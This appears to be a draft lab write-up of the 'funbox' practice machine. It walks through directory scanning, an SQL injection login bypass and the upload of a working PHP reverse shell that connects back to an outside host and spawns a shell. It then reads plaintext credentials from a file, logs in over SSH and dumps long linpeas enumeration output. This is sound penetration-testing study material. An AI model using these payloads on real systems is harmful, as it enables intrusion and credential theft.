
+++
title = 'funbox'
date = '2023-12-07T16:08:29+08:00'
draft = true
+++
```
nmap -sS -sV -A -p- --min-rate 5000 192.168.183.111

```

```
┌──(root㉿kali)-[~/桌面/vpn]
└─# gobuster dir -u http://192.168.183.111/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -x php,txt,log,conf
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.183.111/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,log,conf,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/05/06 10:46:09 Starting gobuster in directory enumeration mode
===============================================================
http://192.168.183.111/.php                 (Status: 403) [Size: 280]
http://192.168.183.111/index.php            (Status: 200) [Size: 3468]
http://192.168.183.111/profile.php          (Status: 302) [Size: 7247] [--> http://192.168.183.111/index.php]                                                       
http://192.168.183.111/header.php           (Status: 200) [Size: 1666]
http://192.168.183.111/store                (Status: 301) [Size: 318] [--> http://192.168.183.111/store/]                                                           
http://192.168.183.111/admin                (Status: 301) [Size: 318] [--> http://192.168.183.111/admin/]                                                           
http://192.168.183.111/registration.php     (Status: 200) [Size: 9409]
http://192.168.183.111/logout.php           (Status: 200) [Size: 75]
http://192.168.183.111/robots.txt           (Status: 200) [Size: 14]
http://192.168.183.111/dashboard.php        (Status: 302) [Size: 10272] [--> http://192.168.183.111/index.php]                                                      
http://192.168.183.111/secret               (Status: 301) [Size: 319] [--> http://192.168.183.111/secret/]                                                          
http://192.168.183.111/leftbar.php          (Status: 200) [Size: 1837]

```

```
admin' or 1=1-- +
```

上传反弹shell的php文件

```
<?php
$sock = fsockopen("192.168.45.5", 1234);
$descriptorspec = array(
        0 => $sock,
        1 => $sock,
        2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
?>

```

```
cat /var/www/loal.txt
4d398ace4b6acf45d1b7f2e3e84c344b
cd /home/tony
cat password.txt
tony@funbox3:~$ cat password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin

```

使用ssh登录

```
ssh tony@192.168.183.111 //密码是yxcvbnmYYY
```



```
tony@funbox3:~$ ./linpeas.sh


                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    linpeas v3.1.5 - Safe OSCP by carlospolop
                                                                                  
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                
                                                                                  
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist                                                                
 LEGEND:                                                                          
  RED/YELLOW: 95% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username

 Starting linpeas. Caching Writable Folders...

════════════════════════════════════╣ Basic information ╠════════════════════════════════════                                                                       
OS: Linux version 5.4.0-42-generic (buildd@lgw01-amd64-038) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020
User & Groups: uid=1000(tony) gid=1000(tony) groups=1000(tony),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)                                               
Hostname: funbox3
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)                                                               
[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                   
                                                                                  

Caching directories using 1 threads . . . . . . . . . . . . . . . . . . . . . . . . DONE                                                                            
                                                                                  
════════════════════════════════════╣ System Information ╠════════════════════════════════════                                                                      
[+] Operative system                                                              
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits   
Linux version 5.4.0-42-generic (buildd@lgw01-amd64-038) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020
Distributor ID: Ubuntu
Description:    Ubuntu 20.04 LTS
Release:        20.04
Codename:       focal

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version      
Sudo version 1.8.31                                                               

[+] USBCreator
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                        
                                                                                  
[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

[+] Date
Sat May  6 04:45:07 UTC 2023                                                      

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                  
udev            448M     0  448M   0% /dev
tmpfs            99M  1.1M   98M   2% /run
/dev/sda2       4.7G  3.7G  809M  83% /
tmpfs           491M     0  491M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           491M     0  491M   0% /sys/fs/cgroup
/dev/sda3       179M  101M   64M  62% /boot
/dev/loop0       56M   56M     0 100% /snap/core18/1932
/dev/loop3       56M   56M     0 100% /snap/core18/1885
/dev/loop4       31M   31M     0 100% /snap/snapd/9279
/dev/loop1       70M   70M     0 100% /snap/lxd/18013
/dev/loop5       31M   31M     0 100% /snap/snapd/9721
/dev/loop2       70M   70M     0 100% /snap/lxd/18077
tmpfs            99M     0   99M   0% /run/user/1000
              total        used        free      shared  buff/cache   available
Mem:        1004780      538856       87860        4096      378064      296940
Swap:        677884        3084      674800

[+] CPU info
Architecture:                    x86_64                                           
CPU op-mode(s):                  32-bit, 64-bit
Byte Order:                      Little Endian
Address sizes:                   45 bits physical, 48 bits virtual
CPU(s):                          1
On-line CPU(s) list:             0
Thread(s) per core:              1
Core(s) per socket:              1
Socket(s):                       1
NUMA node(s):                    1
Vendor ID:                       AuthenticAMD
CPU family:                      23
Model:                           1
Model name:                      AMD EPYC 7371 16-Core Processor
Stepping:                        2
CPU MHz:                         3094.187
BogoMIPS:                        6188.37
Hypervisor vendor:               VMware
Virtualization type:             full
L1d cache:                       32 KiB
L1i cache:                       64 KiB
L2 cache:                        512 KiB
L3 cache:                        64 MiB
NUMA node0 CPU(s):               0
Vulnerability Itlb multihit:     Not affected
Vulnerability L1tf:              Not affected
Vulnerability Mds:               Not affected
Vulnerability Meltdown:          Not affected
Vulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled via
                                  prctl and seccomp
Vulnerability Spectre v1:        Mitigation; usercopy/swapgs barriers and __user p
                                 ointer sanitization
Vulnerability Spectre v2:        Mitigation; Full AMD retpoline, IBPB conditional,
                                  STIBP disabled, RSB filling
Vulnerability Srbds:             Not affected
Vulnerability Tsx async abort:   Not affected
Flags:                           fpu vme de pse tsc msr pae mce cx8 apic sep mtrr 
                                 pge mca cmov pat pse36 clflush mmx fxsr sse sse2 
                                 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm cons
                                 tant_tsc rep_good nopl tsc_reliable nonstop_tsc c
                                 puid extd_apicid pni pclmulqdq ssse3 fma cx16 sse
                                 4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c
                                  rdrand hypervisor lahf_lm extapic cr8_legacy abm
                                  sse4a misalignsse 3dnowprefetch osvw ssbd ibpb v
                                 mmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx sm
                                 ap clflushopt sha_ni xsaveopt xsavec xgetbv1 xsav
                                 es clzero arat overflow_recov succor

[+] Environment
[i] Any private information inside environment variables?                         
LESSOPEN=| /usr/bin/lesspipe %s                                                   
HISTFILESIZE=0
USER=tony
SSH_CLIENT=192.168.45.5 39270 22
XDG_SESSION_TYPE=tty
SHLVL=1
MOTD_SHOWN=pam
HOME=/home/tony
SSH_TTY=/dev/pts/1
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
LOGNAME=tony
_=./linpeas.sh
XDG_SESSION_CLASS=user
TERM=xterm-256color
XDG_SESSION_ID=9
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1000
LANG=C.UTF-8
HISTSIZE=0
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
SSH_CONNECTION=192.168.45.5 39270 192.168.183.111 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
HISTFILE=/dev/null

[+] Searching Signature verification failed in dmseg
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                                                                 
 Not Found                                                                        
                                                                                  
[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
[+] grsecurity present? ............ grsecurity Not Found
[+] PaX bins present? .............. PaX Not Found                                
[+] Execshield enabled? ............ Execshield Not Found                         
[+] SELinux enabled? ............... sestatus Not Found                           
[+] Is ASLR enabled? ............... Yes                                          
[+] Printer? ....................... lpstat Not Found
[+] Is this a virtual machine? ..... Yes (vmware)                                 
[+] Is this a container? ........... No
[+] Any running containers? ........ No                                           
                                                                                  

═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════                                                                      
[+] Any sd*/disk* disk in /dev? (limit 20)                                        
disk                                                                              
sda
sda1
sda2
sda3

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                       
/dev/disk/by-uuid/12e1c912-68fd-4eb9-8269-78577701ff7b / ext4 defaults 0 0        
/dev/disk/by-uuid/f1ceb436-2aed-462e-9b2f-bd1301ce609d /boot ext4 defaults 0 0
/swap.img       none    swap    sw      0       0


════════════════════════════════════╣ Available Software ╠════════════════════════════════════                                                                      
[+] Useful software                                                               
/usr/bin/nc                                                                       
/usr/bin/netcat
/usr/bin/wget
/usr/bin/curl
/usr/bin/ping
/usr/bin/base64
/usr/bin/python3
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo
/snap/bin/lxc

[+] Installed Compiler
                                                                                  

══════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════                                                       
[+] Cleaned processes                                                             
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                            
root        6192  0.0  0.0   2488   584 ?        S    04:45   0:00  _ bpfilter_umh
root           1  0.0  1.1 169668 11484 ?        Ss   02:32   0:01 /sbin/init maybe-ubiquity
root         424  0.0  1.3  51632 13104 ?        S<s  02:32   0:00 /lib/systemd/systemd-journald
root         454  0.0  0.5  21332  5108 ?        Ss   02:32   0:00 /lib/systemd/systemd-udevd
root        5451  0.0  0.2  21332  2828 ?        S    04:45   0:00  _ /lib/systemd/systemd-udevd
root        5453  0.0  0.2  21332  2828 ?        S    04:45   0:00  _ /lib/systemd/systemd-udevd
root        5455  0.0  0.2  21332  2828 ?        S    04:45   0:00  _ /lib/systemd/systemd-udevd
root        5456  0.0  0.2  21332  2828 ?        S    04:45   0:00  _ /lib/systemd/systemd-udevd
root        5457  0.0  0.2  21332  2828 ?        S    04:45   0:00  _ /lib/systemd/systemd-udevd
root        5458  0.0  0.2  21332  2828 ?        S    04:45   0:00  _ /lib/systemd/systemd-udevd
root        5459  0.0  0.2  21332  2828 ?        S    04:45   0:00  _ /lib/systemd/systemd-udevd
root        5460  0.0  0.2  21332  2828 ?        S    04:45   0:00  _ /lib/systemd/systemd-udevd
root        5461  0.0  0.2  21332  2828 ?        S    04:45   0:00  _ /lib/systemd/systemd-udevd
root        5462  0.0  0.2  21332  2828 ?        S    04:45   0:00  _ /lib/systemd/systemd-udevd
root         581  0.0  1.7 345752 17976 ?        SLsl 02:32   0:01 /sbin/multipathd -d -s
systemd+     638  0.0  0.6  90388  6288 ?        Ssl  02:32   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         641  0.0  0.9  46312  9184 ?        Ss   02:32   0:00 /usr/bin/VGAuthService                                                                           
root         643  0.0  0.6 235868  6512 ?        Ssl  02:32   0:03 /usr/bin/vmtoolsd                                                                                
systemd+     702  0.0  1.1  24044 11252 ?        Ss   02:32   0:00 /lib/systemd/systemd-resolved
root         781  0.0  0.6 234332  6176 ?        Ssl  02:34   0:00 /usr/lib/accountsservice/accounts-daemon                                                         
root         798  0.0  0.2   5568  2900 ?        Ss   02:34   0:00 /usr/sbin/cron -f
message+     800  0.0  0.4   7588  4156 ?        Ss   02:34   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         811  0.0  1.3  26236 13164 ?        Ss   02:34   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
syslog       813  0.0  0.4 224324  4912 ?        Ssl  02:34   0:00 /usr/sbin/rsyslogd -n -iNONE
root         815  0.0  3.0 629544 30656 ?        Ssl  02:34   0:01 /usr/lib/snapd/snapd
root         831  0.0  0.7  16808  7812 ?        Ss   02:34   0:00 /lib/systemd/systemd-logind
daemon[0m       840  0.0  0.2   3792  2388 ?        Ss   02:34   0:00 /usr/sbin/atd -f
root         842  0.0  1.6 194060 16340 ?        Ss   02:34   0:00 /usr/sbin/apache2 -k start                                                                       
www-data    1687  0.0  1.5 194840 15556 ?        S    02:39   0:01  _ /usr/sbin/apache2 -k start                                                                    
www-data    1690  0.0  1.4 194872 14756 ?        S    02:39   0:01  _ /usr/sbin/apache2 -k start                                                                    
www-data    4860  0.0  0.0   2608   604 ?        S    04:35   0:00  |   _ sh -c /bin/sh
www-data    4861  0.0  0.0   2608   544 ?        S    04:35   0:00  |       _ /bin/sh
www-data    4892  0.0  0.7  12944  7236 ?        S    04:36   0:00  |           _ python3 -c import pty; pty.spawn("/bin/bash")
www-data    4893  0.0  0.3   4336  3664 pts/0    Ss+  04:36   0:00  |               _ /bin/bash
www-data    1873  0.0  1.5 194864 15500 ?        S    02:46   0:01  _ /usr/sbin/apache2 -k start                                                                    
www-data    2745  0.0  1.5 194848 15252 ?        S    03:16   0:01  _ /usr/sbin/apache2 -k start                                                                    
www-data    2772  0.0  1.4 194840 14532 ?        S    03:17   0:01  _ /usr/sbin/apache2 -k start                                                                    
www-data    2958  0.0  1.4 194840 14748 ?        S    03:24   0:01  _ /usr/sbin/apache2 -k start                                                                    
www-data    3204  0.0  1.3 194864 13672 ?        S    03:34   0:00  _ /usr/sbin/apache2 -k start                                                                    
www-data    4841  0.0  0.9 194576  9104 ?        S    04:35   0:00  _ /usr/sbin/apache2 -k start                                                                    
www-data    4932  0.0  0.9 194576  9104 ?        S    04:38   0:00  _ /usr/sbin/apache2 -k start                                                                    
www-data    5297  0.0  0.9 194576  9320 ?        S    04:42   0:00  _ /usr/sbin/apache2 -k start                                                                    
www-data    5298  0.0  0.9 194576  9336 ?        S    04:42   0:00  _ /usr/sbin/apache2 -k start                                                                    
tony        5191  0.0  0.5  13920  5756 ?        S    04:39   0:00      _ sshd: tony@pts/1
tony        5197  0.0  0.4   7064  4968 pts/1    Ss   04:39   0:00          _ -bash
tony        5360  0.1  0.2   2948  2072 pts/1    S+   04:45   0:00              _ /bin/sh ./linpeas.sh
tony        6256  0.0  0.0   2948   524 pts/1    S+   04:45   0:00                  _ /bin/sh ./linpeas.sh
tony        6260  0.0  0.3   7792  3288 pts/1    R+   04:45   0:00                  |   _ ps fauxwww
tony        6259  0.0  0.0   2948   524 pts/1    S+   04:45   0:00                  _ /bin/sh ./linpeas.sh
root         941  0.0  0.5 232700  5856 ?        Ssl  02:34   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         946  0.0  1.4 105060 14536 ?        Ssl  02:34   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
mysql        947  0.1 37.5 1302824 377432 ?      Ssl  02:34   0:14 /usr/sbin/mysqld
root         948  0.0  0.1   2860  1752 tty1     Ss+  02:34   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
systemd+    1342  0.0  0.6  18544  6364 ?        Ss   02:34   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
tony        5071  0.0  0.9  18552  9500 ?        Ss   04:39   0:00 /lib/systemd/systemd --user
tony        5072  0.0  0.3 171004  3480 ?        S    04:39   0:00  _ (sd-pam)
root        6011  3.0  0.1   4636  1848 ?        Ss   04:45   0:00 /bin/sh /snap/lxd/18077/commands/daemon.start                                                    
root        6156 38.0  4.4 1423324 44800 ?       Sl   04:45   0:00  _ lxd --logfile /var/snap/lxd/common/lxd/logs/lxd.log --group lxd
root        6157 25.0  3.1 1007536 31432 ?       Sl   04:45   0:00  _ lxd waitready
root        6158  0.0  0.0   4636   124 ?        S    04:45   0:00  _ /bin/sh /snap/lxd/18077/commands/daemon.start
root        6181  0.0  0.0   6288   844 ?        S    04:45   0:00      _ sleep 1
root        6145  0.0  0.1  97804  1632 ?        Sl   04:45   0:00 lxcfs /var/snap/lxd/common/var/lib/lxcfs -p /var/snap/lxd/common/lxcfs.pid

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes         
1.2M -rwxr-xr-x 1 root root 1.2M Feb 25  2020 /bin/bash                           
   0 lrwxrwxrwx 1 root root    4 Apr 23  2020 /bin/sh -> dash
1.5M -rwxr-xr-x 1 root root 1.6M Apr 22  2020 /lib/systemd/systemd
156K -rwxr-xr-x 1 root root 155K Apr 22  2020 /lib/systemd/systemd-journald
260K -rwxr-xr-x 1 root root 259K Apr 22  2020 /lib/systemd/systemd-logind
2.2M -rwxr-xr-x 1 root root 2.2M Apr 22  2020 /lib/systemd/systemd-networkd
396K -rwxr-xr-x 1 root root 395K Apr 22  2020 /lib/systemd/systemd-resolved
 56K -rwxr-xr-x 1 root root  55K Apr 22  2020 /lib/systemd/systemd-timesyncd
716K -rwxr-xr-x 1 root root 719K Apr 22  2020 /lib/systemd/systemd-udevd
 68K -rwxr-xr-x 1 root root  68K Apr  2  2020 /sbin/agetty
   0 lrwxrwxrwx 1 root root   20 Apr 22  2020 /sbin/init -> /lib/systemd/systemd
128K -rwxr-xr-x 1 root root 127K Apr  6  2020 /sbin/multipathd
140K -rwxr-xr-x 1 root root 139K Jun 22  2020 /usr/bin/VGAuthService
244K -rwxr-xr-x 1 root root 244K Jun 11  2020 /usr/bin/dbus-daemon[0m
   0 lrwxrwxrwx 1 root root    9 Mar 13  2020 /usr/bin/python3 -> python3.8
 64K -rwxr-xr-x 1 root root  63K Jun 22  2020 /usr/bin/vmtoolsd
200K -rwxr-xr-x 1 root root 199K Mar 30  2020 /usr/lib/accountsservice/accounts-daemon
120K -rwxr-xr-x 1 root root 119K Aug 16  2019 /usr/lib/policykit-1/polkitd
 25M -rwxr-xr-x 1 root root  25M Jul 10  2020 /usr/lib/snapd/snapd
692K -rwxr-xr-x 1 root root 689K Apr 13  2020 /usr/sbin/apache2
 32K -rwxr-xr-x 1 root root  31K Nov 12  2018 /usr/sbin/atd
 56K -rwxr-xr-x 1 root root  55K Feb 13  2020 /usr/sbin/cron
 63M -rwxr-xr-x 1 root root  63M Jul 27  2020 /usr/sbin/mysqld
712K -rwxr-xr-x 1 root root 711K Feb 11  2020 /usr/sbin/rsyslogd

[+] Files opened by processes belonging to other users
[i] This is usually empty because of the lack of privileges to read other user processes information                                                                
COMMAND    PID  TID TASKCMD               USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME

[+] Processes with credentials in memory (root req)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                                     
gdm-password Not Found                                                            
gnome-keyring-daemon Not Found                                                    
lightdm Not Found                                                                 
vsftpd Not Found                                                                  
apache2 process found (dump creds from memory as root)                            
sshd: process found (dump creds from memory as root)

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                                                                 
/usr/bin/crontab                                                                  
incrontab Not Found
-rw-r--r-- 1 root root 1042 Feb 13  2020 /etc/crontab                             

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Jul 30  2020 .
drwxr-xr-x 97 root root 4096 Oct 30  2020 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--  1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--  1 root root  712 Mar 27  2020 php
-rw-r--r--  1 root root  191 Apr 23  2020 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x  2 root root 4096 Jul 30  2020 .
drwxr-xr-x 97 root root 4096 Oct 30  2020 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root  539 Apr 13  2020 apache2
-rwxr-xr-x  1 root root  376 Dec  4  2019 apport
-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Apr 23  2020 .
drwxr-xr-x 97 root root 4096 Oct 30  2020 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Apr 23  2020 .
drwxr-xr-x 97 root root 4096 Oct 30  2020 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Apr 23  2020 .
drwxr-xr-x 97 root root 4096 Oct 30  2020 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root  813 Feb 25  2020 man-db
-rwxr-xr-x  1 root root  211 Apr  2  2020 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


[+] Services
[i] Search for outdated versions                                                  
 [ - ]  apache-htcacheclean                                                       
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  grub-common
 [ - ]  hwclock.sh
 [ - ]  irqbalance
 [ - ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ - ]  lvm2-lvmpolld
 [ + ]  multipath-tools
 [ + ]  mysql
 [ - ]  open-iscsi
 [ + ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ + ]  unattended-upgrades
 [ - ]  uuidd

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                                                                         
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin       

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services          
/lib/systemd/system/atd.service is executing some relative path                   
/lib/systemd/system/initrd-cleanup.service is executing some relative path
/lib/systemd/system/initrd-parse-etc.service is executing some relative path
/lib/systemd/system/initrd-switch-root.service is executing some relative path
/lib/systemd/system/initrd-udevadm-cleanup-db.service is executing some relative path
/lib/systemd/system/mdmonitor-oneshot.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service is executing some relative path
/lib/systemd/system/sysinit.target.wants/systemd-udevd.service is executing some relative path
/lib/systemd/system/systemd-ask-password-console.service is executing some relative path
/lib/systemd/system/systemd-ask-password-wall.service is executing some relative path
/lib/systemd/system/systemd-boot-system-token.service is executing some relative path
/lib/systemd/system/systemd-halt.service is executing some relative path
/lib/systemd/system/systemd-hwdb-update.service is executing some relative path
/lib/systemd/system/systemd-journal-flush.service is executing some relative path
/lib/systemd/system/systemd-kexec.service is executing some relative path
/lib/systemd/system/systemd-machine-id-commit.service is executing some relative path
/lib/systemd/system/systemd-sysusers.service is executing some relative path
/lib/systemd/system/systemd-tmpfiles-clean.service is executing some relative path
/lib/systemd/system/systemd-udev-settle.service is executing some relative path
/lib/systemd/system/systemd-udev-trigger.service is executing some relative path
/lib/systemd/system/systemd-udevd.service is executing some relative path
/lib/systemd/system/udev.service is executing some relative path
/lib/systemd/user/systemd-tmpfiles-clean.service is executing some relative path
/lib/systemd/user/systemd-tmpfiles-setup.service is executing some relative path
You can't write on systemd PATH

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers            
NEXT                        LEFT           LAST                        PASSED       UNIT                         ACTIVATES                     
Sat 2023-05-06 05:09:00 UTC 23min left     Sat 2023-05-06 04:39:03 UTC 6min ago     phpsessionclean.timer        phpsessionclean.service       
Sat 2023-05-06 06:48:24 UTC 2h 3min left   Sat 2023-05-06 02:34:45 UTC 2h 10min ago apt-daily-upgrade.timer      apt-daily-upgrade.service     
Sat 2023-05-06 11:54:21 UTC 7h left        Sat 2023-05-06 02:34:45 UTC 2h 10min ago apt-daily.timer              apt-daily.service             
Sat 2023-05-06 14:55:57 UTC 10h left       Sat 2023-05-06 02:34:45 UTC 2h 10min ago motd-news.timer              motd-news.service             
Sat 2023-05-06 17:09:08 UTC 12h left       Sat 2023-05-06 02:34:45 UTC 2h 10min ago fwupd-refresh.timer          fwupd-refresh.service         
Sun 2023-05-07 00:00:00 UTC 19h left       Sat 2023-05-06 02:34:45 UTC 2h 10min ago logrotate.timer              logrotate.service             
Sun 2023-05-07 00:00:00 UTC 19h left       Sat 2023-05-06 02:34:45 UTC 2h 10min ago man-db.timer                 man-db.service                
